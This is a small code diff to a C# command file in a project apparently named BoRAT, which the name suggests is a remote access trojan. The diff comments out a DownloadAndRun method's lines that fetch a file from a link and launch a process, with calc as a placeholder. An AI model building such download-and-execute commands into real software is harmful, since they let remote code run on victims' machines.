@@ -38,8 +38,8 @@ namespace BoRAT.Core.Commands
 
         private static void DownloadAndRun(string link)
         {
-            Http.DownloadFile(link);
-            Process.Start("cmd /C calc");
+            //Http.DownloadFile(link);
+            //Process.Start("cmd /C calc");
         }
     }
 }
